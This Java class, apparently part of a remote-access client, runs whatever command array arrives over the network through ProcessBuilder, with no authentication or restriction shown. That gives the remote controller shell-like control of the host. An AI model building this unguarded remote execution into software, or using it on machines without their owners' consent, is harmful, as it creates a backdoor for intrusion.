package Client.Features;

import Handler.PacketHandler;
import Tools.Network.NetworkInterface;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Arrays;

import static Tools.Network.NetworkInterface.Sleep;

public class CMDControl extends Feature {

    private InputStream is;
    private OutputStream os;

    private byte[] buffer;

    public CMDControl(PacketHandler packetHandler) {
        super(packetHandler);
    }

    @Override
    public void stopFeature() {
        running = false;
    }

    @Override
    public void startFeature() {
        running = true;
        thread.execute(run());
    }

    public void setReceivedBuffer(byte[] buffer){
        this.buffer = buffer;
    }

    @Override
    protected Runnable run() {
        return () -> {
            while (running) {
                try {
                    Sleep(1000/60);

                    if(buffer.length == 0 || buffer[0] == 0 || buffer[0] != NetworkInterface.CommandByte.CHAT_BYTE) continue;

                    String[] arr = (String[]) objectHandler.readModifiedObjects(buffer).get();
                    System.out.println(Arrays.toString(arr));
                    Process p = new ProcessBuilder(arr).start();

                    is = p.getInputStream();
                    os = p.getOutputStream();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };
    }

    @Override
    public void disposeAll() {
        thread.shutdown();
    }
}
